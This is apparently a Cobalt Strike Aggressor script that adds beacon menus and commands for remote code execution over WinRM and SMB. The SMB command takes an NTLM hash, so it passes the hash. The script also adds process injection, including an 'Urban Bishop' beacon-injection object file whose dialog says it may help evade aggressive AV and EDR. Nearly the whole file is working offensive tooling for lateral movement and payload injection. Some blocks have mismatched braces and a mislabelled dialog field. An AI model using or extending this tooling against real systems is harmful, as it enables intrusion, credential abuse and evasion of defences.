    ###################################		         		###################################
#######################################		         		#######################################
  #####################################		         		#####################################
           ############################		  Menus 		############################
########################
##
## WinRM Item
##
########################

item "WinRM w/CSharp"{

    local('$bid');
        foreach $bid ($1){
            winrmcsharp($bid);
      }

    }

    
########################
##
## SMB Execution
##
########################


item "SMB Code Exec using CSharp"{

    local('$bid');
        foreach $bid ($1){
            smbexeccsharp($bid);
      }

    }
    
menu "Custom Process Injection" {

item "RemoteProcessInjection - Mr-Un1k0d3r - x86"{

    local('$bid');
        foreach $bid ($1){
            rpi86($bid);
      }

    }
    
item "RemoteProcessInjection - Mr-Un1k0d3r - x64"{

    local('$bid');
        foreach $bid ($1){
            rpi64($bid);
      }


sub monitor_tickets{
    $bid = $1;
    $dialog = dialog("Urban Bishop Process Injection", %(processid => "", listener => "", execmethod => "fireAlias"), lambda({
        $cmdargs = "";
		$cmdargs = "$3['processid'] $3['listener']";
        if ($3["execmethod"] eq "fireAlias"){
            btask($bid, 'Injecting Urban Bishop');
            bfireAlias($bid, inject-ub, $cmdargs);
        }
    }));
    dialog_description($dialog, "This is a process injection technique that may help with aggressive AV and EDR");
    drow_text($dialog, "processid",  "Process ID to inject into");
    drow_text($dialog, "filteruser",  "Listener Name");
    dbutton_action($dialog, "Run");
	dialog_show($dialog);
}

    } #End Menu


#################################
#
#
# Sk3w's Urban Bishop Injection 
#
#################################    
    
}    
    ###################################		         		###################################
#######################################		         		#######################################
  #####################################		         		#####################################
           ############################		 Functions 		############################

########################
##
## WinRM Module
##
########################
sub winrmcsharp{
    $bid = $1;
    $dialog = dialog("Code Exec with WinRM using CSharp", %(hostname => "", fqdn => "", username => "", pass => "", command => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
		$cmdargs = "$3['hostname'] $3['fqdn'] $3['username'] $3['pass'] $3['command']";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Executing WinRM');
            bexecute_assembly($bid, script_resource('/exe/winrm.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Execute Code Remotely with WinRM, Using CSharp");
    drow_text($dialog, "hostname",  "Hostname - Try not to use IP");
    drow_text($dialog, "fqdn",  "FQDN");
    drow_text($dialog, "username",  "User Name");
    drow_text($dialog, "pass",  "Cleartext Password");
    drow_text($dialog, "command",  "Command to Run");    
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);
}


########################
##
## SMB Execution Module
##
########################


sub smbexeccsharp{
    $bid = $1;
    $dialog = dialog("Code Exec with SMB using CSharp", %(hash => "", username => "", domain => "", target => "", command => """", servicename => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
		$cmdargs = "hash:$3['hash'] username:$3['username'] domain:$3['domain'] target:$3['target'] command:$3['command'] servicename:$3['servicename']"; 
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Executing Code w/SMBExec');
            bexecute_assembly($bid, script_resource('/exe/Sharp-SMBExec.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Execute Code Remotely using SMB, Using CSharp - Please use cmd /c or cmd /r if your command runs an executable, also please enclose command in double quotes");
    drow_text($dialog, "hash",  "NTLM Hash of user");
    drow_text($dialog, "username",  "User Name");
    drow_text($dialog, "domain",  "Domain - FQDN Preferred");
    drow_text($dialog, "target",  "Target to run command on - FQDN Preferred");
    drow_text($dialog, "command",  "Command to Run - enlose in quotes");    
    drow_text($dialog, "servicename",  "Name of Service to Create"); 
    dbutton_action($dialog, "Execute");
	dialog_show($dialog);
}







#################################
#
#
# Sk3w's Urban Bishop Injection (Command Registers)
#
#################################

alias getversion {
    local('$barch $handle $data');
    $barch  = barch($1);
    $handle = openf(script_resource("/exe/getversion. $+ $barch $+ .o"));
    $data = readb($handle, -1);
    closef($handle);
    beacon_inline_execute($1, $data, "go");
}

beacon_command_register(
    "getversion",
    "get windows major.minor.build version",
    "Usage: getversion");

alias inject-ub {
    local('$barch $handle $data $payload $args');
    $barch  = barch($1);
    $handle = openf(script_resource("/exe/inject_urbanbishop. $+ $barch $+ .o"));
    $data = readb($handle, -1);
    closef($handle);
    $payload = artifact_payload($3, "raw", $barch);
    $args = bof_pack($1, "ib", $2, $payload);
    beacon_inline_execute($1, $data, "inject", $args);
}

beacon_command_register(
    "inject-ub",
    "inject beacon using urbanbishop technique",
    "Usage: inject-ub [pid] [listener]");
